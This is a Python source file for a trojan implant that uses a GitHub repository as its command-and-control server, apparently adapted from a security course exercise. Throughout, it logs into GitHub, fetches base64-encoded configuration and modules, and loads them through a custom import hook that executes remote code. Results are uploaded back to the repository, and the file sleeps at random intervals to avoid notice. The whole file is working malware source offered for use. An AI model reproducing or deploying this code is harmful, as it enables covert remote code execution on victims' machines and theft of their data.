import json
import base64
import sys
import time
import imp
import random
import threading
import os
import encodings.idna

from queue import Queue
from github3 import login

gh_username = ''
gh_pass = ''
gh_owner = ''
gh_repo = ''
gh_branch = 'master'

trojan_id = "abc"  # unique id for this trojan
relative_path = "IAS299/trojan/"
trojan_config = relative_path + "config/{0}.json".format(trojan_id)
data_path = relative_path + "data/{0}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = Queue()

def connect_to_github():
	gh = login(username=gh_username, password=gh_pas)
	repo = gh.repository(gh_owner, gh_repo)
	branch = repo.branch(gh_branch)

	return gh, repo, branch

def get_file_contents(filepath):
	gh, repo, branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print("[*] Found file {0}".format(filepath))
			blob = repo.blob(filename._json_data["sha"])
			return blob.content
	return None

def get_trojan_config():
	global configured
	config_json = get_file_contents(trojan_config)
	config = json.loads(base64.b64decode(config_json).decode(encoding="utf-8"))
	configured = True

	for task in config:
		if task["module"] not in sys.modules:
			exec("import {0}".format(task["module"]))
	return config

def store_module_result(data):
	gh, repo, branch = connect_to_github()
	remote_path = relative_path + "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 1000000))
	repo.create_file(remote_path, "[Trojan {0}] Adding data".format(trojan_id), data.encode("utf-8"))

class GitImporter(object):
	def __init__(self):
		self.current_module_code = ""

	def find_module(self, fullname, path=None):
		if configured:
			print("[*] Attemping to retrieve {0}".format(fullname))
			new_library = get_file_contents(relative_path + "modules/{0}".format(fullname))

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self
		return None

	def load_module(self, name):
		module = imp.new_module(name)
		exec(self.current_module_code, module.__dict__)
		sys.modules[name] = module

		return module

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()

	# store the result in the repo
	store_module_result(result)

sys.meta_path += [GitImporter()]

# main trojan loop
while True:
	if task_queue.empty():
		config = get_trojan_config()

		for task in config:
			t = threading.Thread(target=module_runner, args=(task['module'],))
			t.start()
			time.sleep(random.randint(1, 10))
	time.sleep(random.randint(1000, 10000))
